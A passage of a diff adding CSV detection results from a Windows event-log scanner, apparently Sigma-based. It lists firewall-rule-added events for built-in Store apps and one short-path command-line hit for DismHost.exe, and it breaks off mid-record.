+RemoteUserAuthorizationList: ''
+RuleId: '{8129DB6B-AD4B-4CD0-AA49-58F91112934B}'
+RuleName: Xbox TCUI
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-27T14:14:32.492785+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,454,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.XboxIdentityProvider_12.95.3001.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.XboxIdentityProvider/Resources/DisplayName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{978C3FC5-243B-4F21-BBE2-27B16B6D5F4D}'
+RuleName: '@{Microsoft.XboxIdentityProvider_12.95.3001.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.XboxIdentityProvider/Resources/DisplayName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-27T14:14:32.493947+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,455,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.XboxIdentityProvider_12.95.3001.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.XboxIdentityProvider/Resources/DisplayName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{15292014-BC2C-4ED1-9773-D60412B2D165}'
+RuleName: '@{Microsoft.XboxIdentityProvider_12.95.3001.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.XboxIdentityProvider/Resources/DisplayName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-27T14:24:41.960280+00:00,Use Short Name Path in Command Line,[root]/Windows/System32/winevt/Logs/Security.evtx,1,Microsoft-Windows-Security-Auditing,4688,4537,DESKTOP-A1L0P1U,"CommandLine: C:\Users\TOMMYX~1\AppData\Local\Temp\5B0BE216-9AB0-4705-8D44-6C6DC8D5FB27\dismhost.exe {48889BF5-8ACF-4F7B-A535-2458031BD98B}
+MandatoryLabel: S-1-16-12288
+NewProcessId: '0x1e60'
+NewProcessName: C:\Users\TOMMYX~1\AppData\Local\Temp\5B0BE216-9AB0-4705-8D44-6C6DC8D5FB27\DismHost.exe
+ParentProcessName: C:\Windows\System32\cleanmgr.exe
+ProcessId: '0xf6c'
+SubjectDomainName: DESKTOP-A1L0P1U
+SubjectLogonId: '0x20a2e'
+SubjectUserName: tommyxiaomi
+SubjectUserSid: S-1-5-21-2440829697-3443494045-1308846858-1000
+TargetDomainName: '-'
+TargetLogonId: '0x0'
+TargetUserName: '-'
+TargetUserSid: S-1-0-0
+TokenElevationType: '%%1937'
+",
+2024-02-27T14:29:26.065531+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,494,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.MicrosoftStickyNotes_6.0.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.MicrosoftStickyNotes/Resources/StickyNotesStoreAppName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{79D0405E-0FCC-4B79-9BC2-C10382206E85}'
+RuleName: '@{Microsoft.MicrosoftStickyNotes_6.0.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.MicrosoftStickyNotes/Resources/StickyNotesStoreAppName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-27T14:29:26.066195+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,495,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.MicrosoftStickyNotes_6.0.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.MicrosoftStickyNotes/Resources/StickyNotesStoreAppName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{D16F68CB-8210-4BD5-B4F6-A06FF1778F7E}'
+RuleName: '@{Microsoft.MicrosoftStickyNotes_6.0.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.MicrosoftStickyNotes/Resources/StickyNotesStoreAppName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-27T14:29:26.081508+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,496,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.MicrosoftStickyNotes_6.0.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.MicrosoftStickyNotes/Resources/StickyNotesStoreAppName}'
+Flags: 3
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 6
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{0C641E0F-BB43-46B8-B3E6-D749AB145409}'
+RuleName: '@{Microsoft.MicrosoftStickyNotes_6.0.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.MicrosoftStickyNotes/Resources/StickyNotesStoreAppName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 1
+ServiceName: ''
+",
+2024-02-27T14:29:26.083045+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,497,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.MicrosoftStickyNotes_6.0.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.MicrosoftStickyNotes/Resources/StickyNotesStoreAppName}'
+Flags: 3
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 6
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{65862369-A21A-414F-9C41-B1CC20CC38C8}'
+RuleName: '@{Microsoft.MicrosoftStickyNotes_6.0.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.MicrosoftStickyNotes/Resources/StickyNotesStoreAppName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 1
+ServiceName: ''
+",
+2024-02-27T14:29:26.085053+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,498,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.MicrosoftStickyNotes_6.0.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.MicrosoftStickyNotes/Resources/StickyNotesStoreAppName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{A357BBD5-22BB-4B5D-8B70-6D9AFE5293E7}'
+RuleName: '@{Microsoft.MicrosoftStickyNotes_6.0.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.MicrosoftStickyNotes/Resources/StickyNotesStoreAppName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-27T14:29:26.086824+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,499,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.MicrosoftStickyNotes_6.0.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.MicrosoftStickyNotes/Resources/StickyNotesStoreAppName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{1AFDC343-3F20-4825-B9EF-5A19C9DD7B4D}'
+RuleName: '@{Microsoft.MicrosoftStickyNotes_6.0.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.MicrosoftStickyNotes/Resources/StickyNotesStoreAppName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-27T14:29:26.088460+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,500,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.MicrosoftStickyNotes_6.0.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.MicrosoftStickyNotes/Resources/StickyNotesStoreAppName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 3
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{B69DAAD0-C2FF-4982-828B-443A78D8C4C4}'
+RuleName: '@{Microsoft.MicrosoftStickyNotes_6.0.2.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.MicrosoftStickyNotes/Resources/StickyNotesStoreAppName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:10:50.081853+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,543,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.WindowsCalculator_11.2401.0.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsCalculator/Resources/AppStoreName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{9C27772F-BA41-492C-87C8-39574B1146A4}'
+RuleName: '@{Microsoft.WindowsCalculator_11.2401.0.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsCalculator/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:10:50.083046+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,544,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.WindowsCalculator_11.2401.0.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsCalculator/Resources/AppStoreName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{5675D76B-1D7F-4BE0-B877-E890E08317B8}'
+RuleName: '@{Microsoft.WindowsCalculator_11.2401.0.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsCalculator/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:12:46.207328+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,551,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: Microsoft 365 (Office)
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{8345BFC2-D5FD-4DE4-B24C-34EC6C294A9E}'
+RuleName: Microsoft 365 (Office)
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:12:46.208332+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,552,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: Microsoft 365 (Office)
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{9EC1E25E-F578-43D3-9727-92F4F626F1B1}'
+RuleName: Microsoft 365 (Office)
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:12:50.175579+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,563,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.BingWeather_4.53.52331.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.BingWeather/Resources/ApplicationTitleWithBranding}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{ECFC4D1B-74A9-429B-B124-20DEE4D1CABD}'
+RuleName: '@{Microsoft.BingWeather_4.53.52331.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.BingWeather/Resources/ApplicationTitleWithBranding}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:12:50.176361+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,564,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.BingWeather_4.53.52331.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.BingWeather/Resources/ApplicationTitleWithBranding}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{B7C5D45F-90A2-4732-84AF-C645E5E57663}'
+RuleName: '@{Microsoft.BingWeather_4.53.52331.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.BingWeather/Resources/ApplicationTitleWithBranding}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:12:50.178640+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,565,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.BingWeather_4.53.52331.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.BingWeather/Resources/ApplicationTitleWithBranding}'
+Flags: 3
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 6
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{EEC61AE8-B6A2-4990-A132-949B6DD8C7A9}'
+RuleName: '@{Microsoft.BingWeather_4.53.52331.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.BingWeather/Resources/ApplicationTitleWithBranding}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 1
+ServiceName: ''
+",
+2024-02-28T04:12:50.179655+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,566,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.BingWeather_4.53.52331.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.BingWeather/Resources/ApplicationTitleWithBranding}'
+Flags: 3
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 6
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{F4121E3F-ABE0-4646-BCAD-0A4A058086F9}'
+RuleName: '@{Microsoft.BingWeather_4.53.52331.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.BingWeather/Resources/ApplicationTitleWithBranding}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 1
+ServiceName: ''
+",
+2024-02-28T04:12:50.180335+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,567,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.BingWeather_4.53.52331.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.BingWeather/Resources/ApplicationTitleWithBranding}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{3FEA0CA7-E4DD-41ED-9459-5D45C1912BC4}'
+RuleName: '@{Microsoft.BingWeather_4.53.52331.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.BingWeather/Resources/ApplicationTitleWithBranding}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:12:50.181234+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,568,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.BingWeather_4.53.52331.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.BingWeather/Resources/ApplicationTitleWithBranding}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{3EC776AF-D768-4271-8ADE-7A71E8EADF5E}'
+RuleName: '@{Microsoft.BingWeather_4.53.52331.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.BingWeather/Resources/ApplicationTitleWithBranding}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:12:50.182025+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,569,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.BingWeather_4.53.52331.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.BingWeather/Resources/ApplicationTitleWithBranding}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 3
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{683C5DC2-DCC7-4105-899B-E8DB0BD476E3}'
+RuleName: '@{Microsoft.BingWeather_4.53.52331.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.BingWeather/Resources/ApplicationTitleWithBranding}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:15:12.133176+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,576,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 1
+EdgeTraversal: 0
+EmbeddedContext: '@{Microsoft.WindowsFeedbackHub_1.2401.20253.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsFeedbackHub/Resources/AppStoreName}'
+Flags: 1
+LocalAddresses: '*'
+LocalOnlyMapped: 0
+LocalPorts: ''
+LooseSourceMapped: 0
+ModifyingApplication: C:\Windows\System32\svchost.exe
+ModifyingUser: S-1-5-80-3088073201-1464728630-1879813800-1107566885-823218052
+Origin: 1
+Profiles: 7
+Protocol: 256
+RemoteAddresses: '*'
+RemoteMachineAuthorizationList: ''
+RemotePorts: ''
+RemoteUserAuthorizationList: ''
+RuleId: '{2BD479EF-8D45-4047-872B-D2E0FD99B906}'
+RuleName: '@{Microsoft.WindowsFeedbackHub_1.2401.20253.0_x64__8wekyb3d8bbwe?ms-resource://Microsoft.WindowsFeedbackHub/Resources/AppStoreName}'
+RuleStatus: 65536
+SchemaVersion: 542
+SecurityOptions: 0
+ServiceName: ''
+",
+2024-02-28T04:15:12.134546+00:00,Uncommon New Firewall Rule Added In Windows Firewall Exception List,[root]/Windows/System32/winevt/Logs/Microsoft-Windows-Windows Firewall With Advanced Security%4Firewall.evtx,1,Microsoft-Windows-Windows Firewall With Advanced Security,2004,577,DESKTOP-A1L0P1U,"Action: 3
+Active: 1
+ApplicationPath: ''
+Direction: 2
+EdgeTraversal: 0
